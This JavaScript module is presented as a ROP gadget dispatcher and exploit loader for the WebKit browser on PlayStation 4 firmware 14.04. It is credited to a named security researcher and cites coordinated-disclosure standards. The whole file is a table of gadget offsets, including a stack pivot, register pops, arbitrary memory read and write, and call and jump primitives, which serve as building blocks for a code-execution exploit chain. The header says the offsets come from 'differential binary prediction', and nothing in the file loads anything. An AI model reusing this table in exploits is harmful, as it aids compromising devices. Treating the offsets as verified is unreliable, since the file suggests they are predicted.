// PS4 Firmware 14.04 WebKit ROP Gadget Dispatcher & Exploit Loader (1404.js)
// García Casado Security Research | Lead Researcher: Adrián García Casado (@adri22235)
// Research Lab: O Castro de Moreda, Monforte de Lemos / O Rañadoiro, Galicia
// Standard: ISO/IEC 29147 Coordinated Vulnerability Disclosure (CVD) & ISO/IEC 30111
// Target: Sony PlayStation 4 - Orbis OS FW 14.04 (Differential Binary Prediction)

(function (root, factory) {
  if (typeof define === 'function' && define.amd) {
    define([], factory);
  } else if (typeof module === 'object' && module.exports) {
    module.exports = factory();
  } else {
    root.webkit_gadgets_1404 = factory();
    root.ps4_1404_loader = factory();
  }
}(typeof self !== 'undefined' ? self : this, function () {
  'use strict';

  const webkit_gadgets_1404 = {
    // Core Execution Control & Stack Pivoting
    wk_RET                        : 0x00004032,  // ret (System V AMD64 alignment)
    wk_LEAVE_RET                  : 0x0001C2F7,  // leave; ret
    wk_XCHG_RAX_RSP_RET           : 0x03F755A8,  // xchg rax, rsp; ret (Golden Stack Pivot)

    // General Purpose Register Pop Primitives
    wk_POP_RAX_RET                : 0x00014504,  // pop rax; ret
    wk_POP_RBX_RET                : 0x0000B9E8,  // pop rbx; ret
    wk_POP_RCX_RET                : 0x0001FADE,  // pop rcx; ret
    wk_POP_RDX_RET                : 0x001305BA,  // pop rdx; ret
    wk_POP_RSI_RET                : 0x0007245E,  // pop rsi; ret
    wk_POP_RDI_RET                : 0x00060480,  // pop rdi; ret
    wk_POP_RBP_RET                : 0x000040B6,  // pop rbp; ret
    wk_POP_RSP_RET                : 0x00073017,  // pop rsp; ret
    wk_POP_R8_RET                 : 0x0230CBE1,  // pop r8; ret
    wk_POP_R12_RET                : 0x0242AB15,  // pop r12; ret
    wk_POP_R14_RET                : 0x000A9E91,  // pop r14; ret
    wk_POP_R15_RET                : 0x0006047F,  // pop r15; ret

    // Register Transfer & Memory Primitives
    wk_MOV_RAX_RDI_RET            : 0x00023320,  // mov rax, rdi; ret
    wk_MOV_RDX_RAX_RET            : 0x001CEBA9,  // mov rdx, rax; ret
    wk_MOV_QWORD_RDI_RAX_RET      : 0x0000948B,  // mov [rdi], rax; ret (Arbitrary Qword Write)
    wk_MOV_RAX_QWORD_RAX_RET      : 0x00014021,  // mov rax, [rax]; ret (Arbitrary Qword Read)
    wk_MOV_RAX_QWORD_RDI_RET      : 0x000E2EA0,  // mov rax, [rdi]; ret

    // Arithmetic & Logic Operations
    wk_ADD_RAX_RCX_RET            : 0x00084F67,  // add rax, rcx; ret
    wk_SUB_RAX_RCX_RET            : 0x0098736C,  // sub rax, rcx; ret
    wk_XOR_RAX_RAX_RET            : 0x023D14F6,  // xor rax, rax; ret (Clear RAX)
    wk_INC_RAX_RET                : 0x00C5E51C,  // inc rax; ret

    // Flow Redirection
    wk_JMP_RAX                    : 0x00004082,  // jmp rax
    wk_CALL_RAX                   : 0x00004041,  // call rax
    wk_JMP_RCX                    : 0x00012A2A,  // jmp rcx

    // Compound Multi-Register Sequences
    wk_POP_R13_POP_R14_POP_R15_RET: 0x0006047B,  // pop r13; pop r14; pop r15; ret
    wk_POP_RBX_POP_RBP_RET        : 0x0000AD0F,  // pop rbx; pop rbp; ret

    // Forensic Metadata
    target_firmware               : "14.04",
    binary_source                 : "libSceNKWebKit.sprx",
    research_lab                  : "García Casado Security Research",
    author                        : "Adrián García Casado (@adri22235)"
  };

  return webkit_gadgets_1404;
}));
